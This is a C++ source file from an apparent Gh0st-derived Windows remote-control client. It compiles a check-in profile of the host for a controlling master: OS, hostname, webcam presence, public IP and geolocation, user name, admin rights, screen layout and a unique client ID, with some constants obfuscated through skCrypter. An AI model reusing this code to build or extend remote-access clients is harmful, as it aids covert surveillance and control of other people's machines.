#include "StdAfx.h"
#include "LoginServer.h"
#include "Common.h"
#include <string>
#include <iostream>
#include <iomanip>
#include <ctime>
#include <NTSecAPI.h>
#include "common/skCrypter.h"
#include <common/iniFile.h>
#include <location.h>
#include "ScreenCapture.h"

std::string getSystemName()
{
    typedef void(__stdcall* NTPROC)(DWORD*, DWORD*, DWORD*);

    HINSTANCE hinst = LoadLibrary("ntdll.dll");
    if (!hinst) {
        return "未知操作系统";
    }

    NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
    if (!proc) {
        FreeLibrary(hinst);
        return "未知操作系统";
    }

    DWORD dwMajor, dwMinor, dwBuildNumber;
    proc(&dwMajor, &dwMinor, &dwBuildNumber);
    dwBuildNumber &= 0xFFFF;  // 高位是标志位，只取低16位

    FreeLibrary(hinst);

    // 判断是否为 Server 版本
    OSVERSIONINFOEX osvi = { sizeof(osvi) };
    GetVersionEx((OSVERSIONINFO*)&osvi);
    bool isServer = (osvi.wProductType != VER_NT_WORKSTATION);

    std::string vname;

    if (dwMajor == 10 && dwMinor == 0) {
        if (isServer) {
            // Windows Server
            if (dwBuildNumber >= 20348)
                vname = "Windows Server 2022";
            else if (dwBuildNumber >= 17763)
                vname = "Windows Server 2019";
            else
                vname = "Windows Server 2016";
        } else {
            // Windows 桌面版
            if (dwBuildNumber >= 22000)
                vname = "Windows 11";
            else
                vname = "Windows 10";
        }
    } else if (dwMajor == 6) {
        switch (dwMinor) {
        case 3:
            vname = isServer ? "Windows Server 2012 R2" : "Windows 8.1";
            break;
        case 2:
            vname = isServer ? "Windows Server 2012" : "Windows 8";
            break;
        case 1:
            vname = isServer ? "Windows Server 2008 R2" : "Windows 7";
            break;
        case 0:
            vname = isServer ? "Windows Server 2008" : "Windows Vista";
            break;
        }
    } else if (dwMajor == 5) {
        switch (dwMinor) {
        case 2:
            vname = "Windows Server 2003";
            break;
        case 1:
            vname = "Windows XP";
            break;
        case 0:
            vname = "Windows 2000";
            break;
        }
    }

    if (vname.empty()) {
        char buf[64];
        sprintf(buf, "Windows (Build %d)", dwBuildNumber);
        vname = buf;
    }

    Mprintf("此电脑的版本为:%s (Build %d)\n", vname.c_str(), dwBuildNumber);
    return vname;
}

std::string formatTime(const FILETIME& fileTime)
{
    // 转换为 64 位时间
    ULARGE_INTEGER ull;
    ull.LowPart = fileTime.dwLowDateTime;
    ull.HighPart = fileTime.dwHighDateTime;

    // 转换为秒级时间戳
    std::time_t startTime = static_cast<std::time_t>((ull.QuadPart / 10000000ULL) - 11644473600ULL);

    // 格式化输出
    std::tm* localTime = std::localtime(&startTime);
    char buffer[100];
    std::strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", localTime);
    return std::string(buffer);
}

std::string getProcessTime()
{
    FILETIME creationTime, exitTime, kernelTime, userTime;

    // 获取当前进程的时间信息
    if (GetProcessTimes(GetCurrentProcess(), &creationTime, &exitTime, &kernelTime, &userTime)) {
        return formatTime(creationTime);
    }
    std::time_t now = std::time(nullptr);
    std::tm* t = std::localtime(&now);
    char buffer[100];
    std::strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", t);
    return buffer;
}

int getOSBits()
{
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);

    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
        si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) {
        return 64;
    } else {
        return 32;
    }
}

// 检查CPU核心数
// SYSTEM_INFO.dwNumberOfProcessors
int GetCPUCores()
{
    INT i = 0;
#ifdef _WIN64
    // 在 x64 下，我们需要使用 `NtQuerySystemInformation`
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    i = sysInfo.dwNumberOfProcessors; // 获取 CPU 核心数
#else
    _asm { // x64编译模式下不支持__asm的汇编嵌入
        mov eax, dword ptr fs : [0x18] ; // TEB
        mov eax, dword ptr ds : [eax + 0x30] ; // PEB
        mov eax, dword ptr ds : [eax + 0x64] ;
        mov i, eax;
    }
#endif
    Mprintf("此计算机CPU核心: %d\n", i);
    return i;
}

double GetMemorySizeGB()
{
    _MEMORYSTATUSEX mst;
    mst.dwLength = sizeof(mst);
    GlobalMemoryStatusEx(&mst);
    double GB = mst.ullTotalPhys / (1024.0 * 1024 * 1024);
    Mprintf("此计算机内存: %fGB\n", GB);
    return GB;
}

#pragma comment(lib, "Version.lib")
std::string GetCurrentExeVersion()
{
    TCHAR filePath[MAX_PATH];
    if (GetModuleFileName(NULL, filePath, MAX_PATH) == 0) {
        return "Unknown";
    }

    DWORD handle = 0;
    DWORD verSize = GetFileVersionInfoSize(filePath, &handle);
    if (verSize == 0) {
        return "Unknown";
    }

    std::vector<BYTE> verData(verSize);
    if (!GetFileVersionInfo(filePath, handle, verSize, verData.data())) {
        return "Unknown";
    }

    VS_FIXEDFILEINFO* pFileInfo = nullptr;
    UINT len = 0;
    if (!VerQueryValue(verData.data(), "\\", reinterpret_cast<LPVOID*>(&pFileInfo), &len)) {
        return "Unknown";
    }

    if (pFileInfo) {
        DWORD major = HIWORD(pFileInfo->dwFileVersionMS);
        DWORD minor = LOWORD(pFileInfo->dwFileVersionMS);
        DWORD build = HIWORD(pFileInfo->dwFileVersionLS);
        DWORD revision = LOWORD(pFileInfo->dwFileVersionLS);

        std::ostringstream oss;
        oss << major << "." << minor << "." << build << "." << revision;
        return "v" + oss.str();
    }

    return "Unknown";
}


std::string GetCurrentUserNameA()
{
    char username[256];
    DWORD size = sizeof(username);

    if (GetUserNameA(username, &size)) {
        return std::string(username);
    } else {
        return "Unknown";
    }
}

#define XXH_INLINE_ALL
#include "server/2015Remote/xxhash.h"
// 基于客户端信息计算唯一ID: { IP, PC, OS, CPU, PATH }
uint64_t CalcalateID(const std::vector<std::string>& clientInfo)
{
    std::string s;
    for (int i = 0; i < 5; i++) {
        s += clientInfo[i] + "|";
    }
    s.erase(s.length()-1);
    return XXH64(s.c_str(), s.length(), 0);
}

LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, CONNECT_ADDRESS& conn, BOOL& isAuthKernel)
{
    isAuthKernel = FALSE;
    iniFile cfg(CLIENT_PATH);
    LOGIN_INFOR  LoginInfor;
    LoginInfor.bToken = TOKEN_LOGIN; // 令牌为登录
    //获得操作系统信息
    strcpy_s(LoginInfor.OsVerInfoEx, getSystemName().c_str());

    //获得PCName
    char szPCName[MAX_PATH] = {0};
    gethostname(szPCName, MAX_PATH);

    DWORD	dwCPUMHz;
    dwCPUMHz = CPUClockMHz();

    BOOL bWebCamIsExist = WebCamIsExist();
    std::string group = cfg.GetStr("settings", "group_name");
    if (!group.empty())
        strcpy_s(conn.szGroupName, group.c_str());
    if (conn.szGroupName[0] == 0)
        memcpy(LoginInfor.szPCName, szPCName, sizeof(LoginInfor.szPCName));
    else
        sprintf(LoginInfor.szPCName, "%s/%s", szPCName, conn.szGroupName);
    LoginInfor.dwSpeed  = dwSpeed;
    LoginInfor.dwCPUMHz = dwCPUMHz;
    LoginInfor.bWebCamIsExist = bWebCamIsExist;
    strcpy_s(LoginInfor.szStartTime, getProcessTime().c_str());
    LoginInfor.AddReserved(GetClientType(conn.ClientType())); // 类型
    LoginInfor.AddReserved(getOSBits());                // 系统位数
    LoginInfor.AddReserved(GetCPUCores());              // CPU核数
    LoginInfor.AddReserved(GetMemorySizeGB());          // 系统内存
    char buf[_MAX_PATH] = {};
    GetModuleFileNameA(NULL, buf, sizeof(buf));
    LoginInfor.AddReserved(buf);                        // 文件路径
    LoginInfor.AddReserved("?");						// test
    std::string installTime = cfg.GetStr("settings", "install_time");
    if (installTime.empty()) {
        installTime = ToPekingTimeAsString(nullptr);
        cfg.SetStr("settings", "install_time", installTime);
    }
    LoginInfor.AddReserved(installTime.c_str());		// 安装时间
    LoginInfor.AddReserved("?");						// 安装信息
    LoginInfor.AddReserved(sizeof(void*)==4 ? 32 : 64); // 程序位数
    std::string str;
    std::string masterHash(skCrypt(MASTER_HASH));
    std::string pid = std::to_string(GetCurrentProcessId());
    HANDLE hEvent1 = OpenEventA(SYNCHRONIZE, FALSE, std::string("YAMA_" + pid).c_str());
    HANDLE hEvent2 = OpenEventA(SYNCHRONIZE, FALSE, std::string("EVENT_" + pid).c_str());
    WIN32_FILE_ATTRIBUTE_DATA fileInfo;
    GetFileAttributesExA(buf, GetFileExInfoStandard, &fileInfo);
    if ((hEvent1 != NULL || hEvent2 != NULL) && fileInfo.nFileSizeLow > 16 * 1024 * 1024) {
        Mprintf("Check event handle: %d, %d\n", hEvent1 != NULL, hEvent2 != NULL);
        isAuthKernel = TRUE;
        SAFE_CLOSE_HANDLE(hEvent1);
        SAFE_CLOSE_HANDLE(hEvent2);
        config*cfg = conn.pwdHash == masterHash ? new config : new iniFile;
        str = cfg->GetStr("settings", "Password", "");
        delete cfg;
        str.erase(std::remove(str.begin(), str.end(), ' '), str.end());
        auto list = StringToVector(str, '-', 3);
        str = list[1].empty() ? "Unknown" : list[1];
    }
    LoginInfor.AddReserved(str.c_str());			   // 授权信息
    bool isDefault = strlen(conn.szFlag) == 0 || strcmp(conn.szFlag, skCrypt(FLAG_GHOST)) == 0 ||
                     strcmp(conn.szFlag, skCrypt("Happy New Year!")) == 0;
    const char* id = isDefault ? masterHash.c_str() : conn.szFlag;
    memcpy(LoginInfor.szMasterID, id, min(strlen(id), 16));
    std::string loc = cfg.GetStr("settings", "location", "");
    std::string pubIP = cfg.GetStr("settings", "public_ip", "");
    auto ip_time = cfg.GetInt("settings", "ip_time");
    bool timeout = ip_time <= 0 || (time(0) - ip_time > 7 * 86400);
    IPConverter cvt;
    if (loc.empty() || pubIP.empty() || timeout) {
        pubIP = cvt.getPublicIP();
        loc = cvt.GetGeoLocation(pubIP);
        cfg.SetStr("settings", "location", loc);
        cfg.SetStr("settings", "public_ip", pubIP);
        cfg.SetInt("settings", "ip_time", time(0));
    }
    LoginInfor.AddReserved(loc.c_str());
    LoginInfor.AddReserved(pubIP.c_str());
    LoginInfor.AddReserved(GetCurrentExeVersion().c_str());
    BOOL IsRunningAsAdmin();
    LoginInfor.AddReserved(GetCurrentUserNameA().c_str());
    LoginInfor.AddReserved(IsRunningAsAdmin());
    char cpuInfo[32];
    sprintf(cpuInfo, "%dMHz", dwCPUMHz);
    conn.clientID = CalcalateID({ pubIP, szPCName, LoginInfor.OsVerInfoEx, cpuInfo, buf });
    auto clientID = std::to_string(conn.clientID);
    Mprintf("此客户端的唯一标识为: %s\n", clientID.c_str());
    char reservedInfo[64];
    int m_iScreenX = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int m_iScreenY = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    auto list = ScreenCapture::GetAllMonitors();
    sprintf_s(reservedInfo, "%d:%d*%d", (int)list.size(), m_iScreenX, m_iScreenY);
    LoginInfor.AddReserved(reservedInfo);               // 屏幕分辨率
    LoginInfor.AddReserved(clientID.c_str());           // 客户端路径
    LoginInfor.AddReserved((int)GetCurrentProcessId()); // 进程ID
    char fileSize[32];
    double MB = fileInfo.nFileSizeLow > 1024 * 1024 ? fileInfo.nFileSizeLow / (1024.0 * 1024.0) : 0;
    double KB = fileInfo.nFileSizeLow > 1024 ? fileInfo.nFileSizeLow / 1024.0 : 0;
    sprintf_s(fileSize, "%.1f%s", MB > 0 ? MB : KB, MB > 0 ? "M" : "K");
    LoginInfor.AddReserved(fileSize);                  // 文件大小
    return LoginInfor;
}


DWORD CPUClockMHz()
{
    HKEY	hKey;
    DWORD	dwCPUMHz;
    DWORD	dwReturn = sizeof(DWORD);
    DWORD	dwType = REG_DWORD;
    RegOpenKey(HKEY_LOCAL_MACHINE,
               "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
    RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMHz, &dwReturn);
    RegCloseKey(hKey);
    return	dwCPUMHz;
}

BOOL WebCamIsExist()
{
    BOOL	bOk = FALSE;

    char	szDeviceName[100], szVer[50];
    for (int i = 0; i < 10 && !bOk; ++i) {
        bOk = capGetDriverDescription(i, szDeviceName, sizeof(szDeviceName),
                                      //系统的API函数
                                      szVer, sizeof(szVer));
    }
    return bOk;
}
